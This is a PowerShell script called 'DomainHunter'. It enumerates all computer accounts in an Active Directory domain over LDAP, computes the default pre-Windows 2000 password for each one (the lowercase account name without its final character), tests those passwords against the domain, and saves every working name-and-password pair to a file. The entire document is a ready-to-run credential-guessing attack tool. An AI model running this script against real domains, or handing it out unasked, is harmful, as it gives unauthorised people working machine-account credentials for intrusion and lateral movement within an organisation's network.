#############################################
# DomainHunter: Pre2k Password Discovery Tool
# Version: 1.0
# Purpose: Advanced enumeration and testing of pre-Windows 2000 computer account passwords
# Author: Bruno Monteiro
# Created: 2024
#############################################

# Get user input for configuration
$OutputPath = Read-Host "Enter the full path and filename for output (e.g. C:\temp\results.txt)"
$FilterOld = Read-Host "Filter for machines with passwords older than 30 days? (y/n)"

# Setup domain connection
$DomainPath = "LDAP://" + ([ADSI]"").distinguishedName
Write-Host "[+] DomainHunter starting..."
Write-Host "[+] Target Domain: $DomainPath"
Write-Host "[+] Successful discoveries will be shown in GREEN"
Write-Host "[+] Results will be saved to: $OutputPath"

# Configure LDAP search parameters
$Searcher = [ADSISearcher]"(&(objectClass=computer))"
$Searcher.SearchRoot = [ADSI]$DomainPath
$Searcher.PropertiesToLoad.Add("samaccountname")    # Computer account name
$Searcher.PropertiesToLoad.Add("pwdlastset")        # Password last set timestamp
$Computers = $Searcher.FindAll()

$SuccessCount = 0
foreach($Computer in $Computers) {
    # Password age filter logic
    if ($FilterOld -eq 'y') {
        $PwdLastSet = [datetime]::FromFileTime([convert]::ToInt64($Computer.Properties["pwdlastset"][0]))
        if ($PwdLastSet -gt (Get-Date).AddDays(-30)) {
            continue  # Skip computers with recent password changes
        }
    }

    # Generate pre-Windows 2000 style password
    $Name = $Computer.Properties["samaccountname"][0]
    $Password = $Name.ToLower().Substring(0,$Name.Length - 1)
    if ($Password.Length -gt 14) {
        $Password = $Password.Substring(0,14)
    }
    
    # Test authentication
    try {
        $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Domain")
        if ($Context.ValidateCredentials($Name, $Password)) {
            # Log successful authentication
            $Result = "[DISCOVERED] Computer: $Name Password: $Password (Last password set: $PwdLastSet)"
            Write-Host $Result -ForegroundColor Green
            Add-Content $OutputPath $Result
            $SuccessCount++
        }
    } catch {
        continue  # Skip failed authentications
    }
}

# Display summary
Write-Host "[+] DomainHunter scan complete!" -ForegroundColor Yellow
Write-Host "[+] Discovered $SuccessCount vulnerable accounts" -ForegroundColor Yellow
Write-Host "[+] Full report available in: $OutputPath" -ForegroundColor Yellow

<#
.SYNOPSIS
DomainHunter - Advanced Pre-Windows 2000 Password Discovery Tool

.DESCRIPTION
Advanced tool for discovering domain computers using predictable pre-Windows 2000 password patterns.
Features:
- Full domain computer enumeration
- Age-based password filtering
- Automated authentication testing
- Detailed success logging

.PARAMETERS
OutputPath - Full path for discovery results
FilterOld - y/n to filter for passwords older than 30 days

.OUTPUTS
- Real-time discovery alerts
- Detailed report file with discovered accounts
#>
